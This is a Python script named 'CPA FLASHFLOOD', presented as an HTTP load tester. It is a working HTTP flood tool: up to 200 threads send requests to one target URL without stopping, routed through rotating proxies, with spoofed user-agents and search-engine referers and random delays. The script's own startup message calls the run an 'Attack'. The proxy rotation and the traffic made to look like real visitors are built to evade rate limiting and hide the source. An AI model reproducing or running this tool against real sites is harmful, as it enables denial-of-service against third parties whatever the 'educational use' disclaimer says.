# -*- coding: utf-8 -*-
import sys
import os
import threading
import random
import requests
import time
import getopt
import urllib.parse
import json
import datetime
from urllib.parse import urlparse
from threading import Thread, Event

# Warna untuk terminal
class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

VERSION = (0, 2, 0)
__version__ = '%d.%d.%d' % VERSION[0:3]

if sys.version_info[0:2] < (3, 5):
    raise RuntimeError('Python 3.5 or higher is required!')

# Banner
BANNER = f"""
{Colors.CYAN}
    ███████╗██╗      █████╗ ███████╗██╗  ██╗██╗  ██╗ ██████╗  ██████╗ ██████╗ 
    ██╔════╝██║     ██╔══██╗██╔════╝██║  ██║██║  ██║██╔═══██╗██╔═══██╗██╔══██╗
    █████╗  ██║     ███████║███████╗███████║███████║██║   ██║██║   ██║██████╔╝
    ██╔══╝  ██║     ██╔══██║╚════██║██╔══██║██╔══██║██║   ██║██║   ██║██╔══██╗
    ██║     ███████╗██║  ██║███████║██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║  ██║
    ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
{Colors.END}"""

# File konfigurasi
proxy_file = 'proxy.txt'
ua_file = 'user-agents.txt'
ref_file = 'referers.txt'
log_file = 'flashflood.log'

ex = Event()
ips = []
ref = []
ua = []
timeout = 10
proto = ''
url = ''
max_threads = 20
request_delay = 1
total_requests = 0
success_requests = 0
failed_requests = 0
lock = threading.Lock()
start_time = 0
use_proxy = True
method = 'GET'
custom_headers = {}
use_jitter = False
jitter_min = 0.5
jitter_max = 1.5
save_log = False
log_data = []

def main(argv):
    global use_proxy, method, custom_headers, use_jitter, jitter_min, jitter_max, save_log
    
    print(BANNER)
    print(f"{Colors.CYAN}🚀 CPA FLASHFLOOD v{__version__} - Advanced HTTP Load Tester{Colors.END}")
    print(f"{Colors.YELLOW}⚠️  For educational and testing purposes only!{Colors.END}")
    print(f"{Colors.YELLOW}Use only on websites you own or have permission{Colors.END}\n")
    
    try:
        opts, args = getopt.getopt(argv, 'hv:t:X:H:j:l', 
            ['help', 'url=', 'timeout=', 'threads=', 'delay=', 'no-proxy', 
             'method=', 'header=', 'jitter=', 'log'])
    except getopt.GetoptError as err:
        print(f"{Colors.RED}✗ Error: {err}{Colors.END}")
        showUsage()
        sys.exit(2)
    
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            showUsage()
            sys.exit(2)
        elif opt in ('-v', '--url'):
            if len(arg) >= 1:
                global url, proto
                url = urllib.parse.unquote(arg)
                link = urlparse(url)
                proto = link.scheme
            else:
                print(f"{Colors.RED}✗ Error: URL cannot be empty!{Colors.END}")
                sys.exit(2)
        elif opt in ('-t', '--timeout'):
            try:
                arg = int(arg)
                if arg >= 1:
                    global timeout
                    timeout = arg
                else:
                    print(f"{Colors.RED}✗ Error: Timeout must be >= 1{Colors.END}")
                    sys.exit(2)
            except ValueError:
                print(f"{Colors.RED}✗ Error: Timeout must be integer{Colors.END}")
                sys.exit(2)
        elif opt == '--threads':
            try:
                arg = int(arg)
                if arg >= 1 and arg <= 200:
                    global max_threads
                    max_threads = arg
                else:
                    print(f"{Colors.RED}✗ Error: Threads must be between 1-200{Colors.END}")
                    sys.exit(2)
            except ValueError:
                print(f"{Colors.RED}✗ Error: Threads must be integer{Colors.END}")
                sys.exit(2)
        elif opt == '--delay':
            try:
                arg = float(arg)
                if arg >= 0:
                    global request_delay
                    request_delay = arg
                else:
                    print(f"{Colors.RED}✗ Error: Delay must be >= 0{Colors.END}")
                    sys.exit(2)
            except ValueError:
                print(f"{Colors.RED}✗ Error: Delay must be number{Colors.END}")
                sys.exit(2)
        elif opt == '--no-proxy':
            use_proxy = False
            print(f"{Colors.YELLOW}⚠️  Proxy disabled, using direct connection{Colors.END}")
        elif opt == '--method' or opt == '-X':
            method = arg.upper()
            if method not in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']:
                print(f"{Colors.RED}✗ Error: Invalid method {method}{Colors.END}")
                sys.exit(2)
            print(f"{Colors.CYAN}ℹ Using method: {method}{Colors.END}")
        elif opt == '--header' or opt == '-H':
            try:
                key, value = arg.split(':', 1)
                custom_headers[key.strip()] = value.strip()
                print(f"{Colors.CYAN}ℹ Custom header: {key.strip()}: {value.strip()}{Colors.END}")
            except:
                print(f"{Colors.RED}✗ Error: Invalid header format. Use 'Key: Value'{Colors.END}")
                sys.exit(2)
        elif opt == '--jitter' or opt == '-j':
            use_jitter = True
            try:
                if ',' in arg:
                    jitter_min, jitter_max = map(float, arg.split(','))
                else:
                    jitter_min = float(arg) * 0.5
                    jitter_max = float(arg) * 1.5
                print(f"{Colors.CYAN}ℹ Jitter enabled: {jitter_min}s - {jitter_max}s{Colors.END}")
            except:
                print(f"{Colors.RED}✗ Error: Invalid jitter format. Use 'min,max' or single value{Colors.END}")
                sys.exit(2)
        elif opt == '--log' or opt == '-l':
            save_log = True
            print(f"{Colors.CYAN}ℹ Logging enabled: {log_file}{Colors.END}")
    
    if not url:
        print(f"{Colors.RED}✗ Error: URL is required!{Colors.END}")
        showUsage()
        sys.exit(2)
    
    parseFiles()

def parseFiles():
    global ips, ua, ref
    
    default_ua = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
    ]
    default_ref = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://www.yahoo.com/',
        'https://duckduckgo.com/',
        'https://www.facebook.com/',
        'https://www.twitter.com/',
        'https://www.instagram.com/',
        'https://www.linkedin.com/'
    ]
    
    ua = default_ua.copy()
    ref = default_ref.copy()
    
    print(f"{Colors.CYAN}📁 Loading Configuration Files{Colors.END}")
    
    # Baca proxy hanya jika use_proxy True
    if use_proxy:
        try:
            if os.path.exists(proxy_file) and os.stat(proxy_file).st_size > 0:
                with open(proxy_file, 'r') as f:
                    content = [row.rstrip() for row in f if row.rstrip() and not row.startswith('#')]
                    if content:
                        ips = content
                        print(f"{Colors.GREEN}  ✓ Loaded {len(ips)} proxies from {proxy_file}{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}  ⚠ No valid proxies found in {proxy_file}{Colors.END}")
                        ips = []
            else:
                print(f"{Colors.YELLOW}  ⚠ File {proxy_file} not found{Colors.END}")
                with open(proxy_file, 'w') as f:
                    f.write('# Add proxies here (format: ip:port)\n')
                    f.write('# Example: 192.168.1.1:8080\n')
                print(f"{Colors.GREEN}  ✓ Created {proxy_file}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}  ✗ Error reading {proxy_file}: {e}{Colors.END}")
            ips = []
    else:
        ips = []
        print(f"{Colors.DIM}  ℹ Proxy disabled by --no-proxy flag{Colors.END}")
    
    # Baca user-agents
    try:
        if os.path.exists(ua_file) and os.stat(ua_file).st_size > 0:
            with open(ua_file, 'r') as f:
                content = [row.rstrip() for row in f if row.rstrip()]
                if content:
                    ua = content
                    print(f"{Colors.GREEN}  ✓ Loaded {len(ua)} user-agents from {ua_file}{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}  ⚠ File {ua_file} empty, using default{Colors.END}")
        else:
            print(f"{Colors.YELLOW}  ⚠ File {ua_file} not found, creating default{Colors.END}")
            with open(ua_file, 'w') as f:
                f.write('\n'.join(default_ua))
            print(f"{Colors.GREEN}  ✓ Created {ua_file}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}  ✗ Error reading {ua_file}: {e}{Colors.END}")
    
    # Baca referers
    try:
        if os.path.exists(ref_file) and os.stat(ref_file).st_size > 0:
            with open(ref_file, 'r') as f:
                content = [row.rstrip() for row in f if row.rstrip()]
                if content:
                    ref = content
                    print(f"{Colors.GREEN}  ✓ Loaded {len(ref)} referers from {ref_file}{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}  ⚠ File {ref_file} empty, using default{Colors.END}")
        else:
            print(f"{Colors.YELLOW}  ⚠ File {ref_file} not found, creating default{Colors.END}")
            with open(ref_file, 'w') as f:
                f.write('\n'.join(default_ref))
            print(f"{Colors.GREEN}  ✓ Created {ref_file}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}  ✗ Error reading {ref_file}: {e}{Colors.END}")
    
    # Summary
    if use_proxy:
        proxy_status = f"{len(ips)} proxies" if ips else "No proxies (direct connection)"
    else:
        proxy_status = "Direct connection (--no-proxy)"
    
    print(f"{Colors.CYAN}📊 Summary: {proxy_status}, {len(ua)} user-agents, {len(ref)} referers{Colors.END}\n")
    testConnection()

def testConnection():
    print(f"{Colors.CYAN}🔗 Testing Connection{Colors.END}")
    print(f"{Colors.WHITE}Target URL: {Colors.GREEN}{url}{Colors.END}")
    print(f"{Colors.WHITE}Method: {Colors.GREEN}{method}{Colors.END}")
    if custom_headers:
        print(f"{Colors.WHITE}Custom Headers: {Colors.GREEN}{len(custom_headers)}{Colors.END}")
    
    try:
        if method == 'GET':
            r = requests.get(url, timeout=timeout)
        elif method == 'POST':
            r = requests.post(url, timeout=timeout)
        elif method == 'HEAD':
            r = requests.head(url, timeout=timeout)
        else:
            r = requests.request(method, url, timeout=timeout)
            
        print(f"{Colors.WHITE}Status: {Colors.GREEN}{r.status_code} {Colors.WHITE}| Size: {Colors.GREEN}{len(r.content)} bytes{Colors.END}")
        print(f"{Colors.GREEN}✅ Connection successful!{Colors.END}\n")
        startTesting()
    except requests.exceptions.Timeout:
        print(f"{Colors.RED}❌ Connection timeout after {timeout}s{Colors.END}")
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}❌ Connection error: Unable to reach {url}{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}❌ Connection failed: {e}{Colors.END}")
        sys.exit(1)

def request_testing(index):
    global total_requests, success_requests, failed_requests
    
    proxy_list = ips.copy() if ips and use_proxy else []
    proxy_index = index % len(proxy_list) if proxy_list else 0
    
    while not ex.is_set():
        try:
            # Calculate jitter delay
            if use_jitter:
                current_delay = random.uniform(jitter_min, jitter_max)
            else:
                current_delay = request_delay
            
            # Pilih proxy
            proxy = None
            proxy_str = 'Direct'
            
            if proxy_list and use_proxy:
                proxy = {
                    'http': f'http://{proxy_list[proxy_index]}',
                    'https': f'http://{proxy_list[proxy_index]}'
                }
                proxy_str = proxy_list[proxy_index]
                proxy_index = (proxy_index + 1) % len(proxy_list)
            
            # Headers
            headers = {
                'User-Agent': random.choice(ua),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Referer': random.choice(ref),
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive'
            }
            
            # Add custom headers
            if custom_headers:
                headers.update(custom_headers)
            
            # Kirim request
            start_time_req = time.time()
            
            if method == 'GET':
                r = requests.get(url, headers=headers, proxies=proxy, timeout=timeout)
            elif method == 'POST':
                r = requests.post(url, headers=headers, proxies=proxy, timeout=timeout)
            elif method == 'HEAD':
                r = requests.head(url, headers=headers, proxies=proxy, timeout=timeout)
            else:
                r = requests.request(method, url, headers=headers, proxies=proxy, timeout=timeout)
            
            response_time = time.time() - start_time_req
            
            # Update stats
            with lock:
                total_requests += 1
                if r.status_code == 200:
                    success_requests += 1
                    status_color = Colors.GREEN
                else:
                    failed_requests += 1
                    status_color = Colors.YELLOW
                
                # Log data
                if save_log:
                    log_entry = {
                        'timestamp': datetime.datetime.now().isoformat(),
                        'thread': index,
                        'method': method,
                        'url': url,
                        'status': r.status_code,
                        'response_time': round(response_time, 3),
                        'proxy': proxy_str,
                        'size': len(r.content)
                    }
                    log_data.append(log_entry)
            
            # Log hasil
            delay_info = f" | delay: {current_delay:.2f}s" if use_jitter else ""
            print(f"{status_color}[{index:>2}] {r.status_code:>3} | {response_time:>5.2f}s | {proxy_str}{delay_info}{Colors.END}")
            
            # Jitter delay
            if current_delay > 0:
                time.sleep(current_delay)
            
        except requests.exceptions.ProxyError:
            print(f"{Colors.RED}[{index:>2}] PROXY ERROR | {proxy_list[proxy_index-1] if proxy_list else 'None'}{Colors.END}")
            with lock:
                if save_log:
                    log_entry = {
                        'timestamp': datetime.datetime.now().isoformat(),
                        'thread': index,
                        'method': method,
                        'url': url,
                        'status': 'PROXY_ERROR',
                        'response_time': 0,
                        'proxy': proxy_list[proxy_index-1] if proxy_list else 'None',
                        'size': 0
                    }
                    log_data.append(log_entry)
            time.sleep(0.5)
        except requests.exceptions.Timeout:
            print(f"{Colors.YELLOW}[{index:>2}] TIMEOUT | {timeout}s{Colors.END}")
            with lock:
                total_requests += 1
                failed_requests += 1
                if save_log:
                    log_entry = {
                        'timestamp': datetime.datetime.now().isoformat(),
                        'thread': index,
                        'method': method,
                        'url': url,
                        'status': 'TIMEOUT',
                        'response_time': timeout,
                        'proxy': proxy_str,
                        'size': 0
                    }
                    log_data.append(log_entry)
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            print(f"{Colors.YELLOW}[{index:>2}] CONNECTION ERROR{Colors.END}")
            with lock:
                total_requests += 1
                failed_requests += 1
                if save_log:
                    log_entry = {
                        'timestamp': datetime.datetime.now().isoformat(),
                        'thread': index,
                        'method': method,
                        'url': url,
                        'status': 'CONNECTION_ERROR',
                        'response_time': 0,
                        'proxy': proxy_str,
                        'size': 0
                    }
                    log_data.append(log_entry)
            time.sleep(1)
        except Exception as e:
            print(f"{Colors.RED}[{index:>2}] ERROR: {str(e)[:30]}{Colors.END}")
            with lock:
                if save_log:
                    log_entry = {
                        'timestamp': datetime.datetime.now().isoformat(),
                        'thread': index,
                        'method': method,
                        'url': url,
                        'status': str(e)[:50],
                        'response_time': 0,
                        'proxy': proxy_str,
                        'size': 0
                    }
                    log_data.append(log_entry)
            time.sleep(1)

def startTesting():
    global start_time
    start_time = time.time()
    
    proxy_status = f"{len(ips)} proxies" if ips and use_proxy else "Direct connection"
    print(f"{Colors.GREEN}🚀 Starting FLASHFLOOD Attack{Colors.END}")
    print(f"{Colors.WHITE}Threads: {Colors.GREEN}{max_threads}{Colors.WHITE} | Timeout: {Colors.GREEN}{timeout}s{Colors.WHITE} | Delay: {Colors.GREEN}{request_delay}s{Colors.END}")
    if use_jitter:
        print(f"{Colors.WHITE}Jitter: {Colors.GREEN}{jitter_min}s - {jitter_max}s{Colors.END}")
    print(f"{Colors.WHITE}Method: {Colors.GREEN}{method}{Colors.END}")
    print(f"{Colors.WHITE}Proxy: {Colors.GREEN}{proxy_status}{Colors.END}")
    if custom_headers:
        print(f"{Colors.WHITE}Custom Headers: {Colors.GREEN}{len(custom_headers)}{Colors.END}")
    if save_log:
        print(f"{Colors.WHITE}Log: {Colors.GREEN}Enabled ({log_file}){Colors.END}")
    print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}\n")
    
    threads = []
    thread_count = max_threads
    
    print(f"{Colors.DIM}─── Request Log ───{Colors.END}")
    
    for i in range(thread_count):
        t = threading.Thread(target=request_testing, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while True:
            time.sleep(1)
            if int(time.time()) % 5 == 0:
                elapsed = time.time() - start_time
                with lock:
                    print(f"\n{Colors.CYAN}📊 REAL-TIME STATISTICS{Colors.END}")
                    print(f"{Colors.WHITE}Elapsed Time : {Colors.GREEN}{elapsed:.1f}s{Colors.END}")
                    print(f"{Colors.WHITE}Requests     : {Colors.GREEN}{total_requests:,}{Colors.END}")
                    print(f"{Colors.WHITE}Success      : {Colors.GREEN}{success_requests:,}{Colors.END}")
                    print(f"{Colors.WHITE}Failed       : {Colors.RED}{failed_requests:,}{Colors.END}")
                    if total_requests > 0:
                        success_rate = (success_requests / total_requests) * 100
                        print(f"{Colors.WHITE}Success Rate : {Colors.GREEN}{success_rate:.2f}%{Colors.END}")
                        req_per_sec = total_requests / elapsed if elapsed > 0 else 0
                        print(f"{Colors.WHITE}Requests/s   : {Colors.GREEN}{req_per_sec:.2f}{Colors.END}")
                    print(f"{Colors.WHITE}Active Thrd  : {Colors.YELLOW}{len([t for t in threads if t.is_alive()])}{Colors.END}\n")
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}🛑 Stopping FLASHFLOOD...{Colors.END}")
        ex.set()
        print(f"{Colors.CYAN}⏳ Waiting for threads to finish...{Colors.END}")
        for t in threads:
            t.join(timeout=2)
        
        # Save log if enabled
        if save_log and log_data:
            try:
                with open(log_file, 'w') as f:
                    json.dump(log_data, f, indent=2)
                print(f"{Colors.GREEN}✅ Log saved to {log_file} ({len(log_data)} entries){Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}❌ Error saving log: {e}{Colors.END}")
        
        # Final stats
        elapsed = time.time() - start_time
        print(f"\n{Colors.CYAN}📊 FINAL STATISTICS{Colors.END}")
        print(f"{Colors.WHITE}Total Time    : {Colors.GREEN}{elapsed:.1f}s{Colors.END}")
        print(f"{Colors.WHITE}Total Requests: {Colors.GREEN}{total_requests:,}{Colors.END}")
        print(f"{Colors.WHITE}Successful    : {Colors.GREEN}{success_requests:,}{Colors.END}")
        print(f"{Colors.WHITE}Failed        : {Colors.RED}{failed_requests:,}{Colors.END}")
        if total_requests > 0:
            success_rate = (success_requests / total_requests) * 100
            print(f"{Colors.WHITE}Success Rate  : {Colors.GREEN}{success_rate:.2f}%{Colors.END}")
            req_per_sec = total_requests / elapsed if elapsed > 0 else 0
            print(f"{Colors.WHITE}Average RPS   : {Colors.GREEN}{req_per_sec:.2f}{Colors.END}")
        print(f"{Colors.GREEN}✅ FLASHFLOOD Stopped Successfully!{Colors.END}\n")

def showUsage():
    print(f"""
{Colors.CYAN}CPA FLASHFLOOD v{__version__} - Advanced HTTP Load Testing Tool{Colors.END}

{Colors.GREEN}USAGE:{Colors.END}
    python script.py {Colors.CYAN}--url{Colors.END} <URL> {Colors.DIM}[OPTIONS]{Colors.END}

{Colors.GREEN}OPTIONS:{Colors.END}
    {Colors.CYAN}-v, --url{Colors.END} <URL>       Target URL {Colors.RED}(required){Colors.END}
    {Colors.CYAN}-t, --timeout{Colors.END} <SEC>   Timeout (default: 10)
    {Colors.CYAN}--threads{Colors.END} <NUM>       Threads (default: 20, max: 200)
    {Colors.CYAN}--delay{Colors.END} <SEC>         Delay between requests (default: 1.0)
    {Colors.CYAN}--no-proxy{Colors.END}            Disable proxy
    {Colors.CYAN}-X, --method{Colors.END} <M>      HTTP method (GET, POST, PUT, DELETE, etc.)
    {Colors.CYAN}-H, --header{Colors.END} <H>      Custom header (format: "Key: Value")
    {Colors.CYAN}-j, --jitter{Colors.END} <V>      Random delay (format: "min,max" or single value)
    {Colors.CYAN}-l, --log{Colors.END}             Save results to log file
    {Colors.CYAN}-h, --help{Colors.END}            Show this help

{Colors.GREEN}EXAMPLES:{Colors.END}
    # Basic GET request
    python script.py --url https://example.com --no-proxy
    
    # POST request with custom headers
    python script.py --url https://api.example.com --method POST -H "Content-Type: application/json" --no-proxy
    
    # With jitter (random delay 0.5-1.5s)
    python script.py --url https://example.com --no-proxy --jitter 0.5,1.5 --threads 30
    
    # Save results to log
    python script.py --url https://example.com --no-proxy --log
    
    # Full features
    python script.py --url https://example.com --method POST -H "X-Custom: test" --jitter 0.5,2.0 --threads 50 --delay 0.1 --log --no-proxy
{Colors.END}""")

if __name__ == '__main__':
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}🛑 Interrupted{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error: {e}{Colors.END}")
        sys.exit(1)
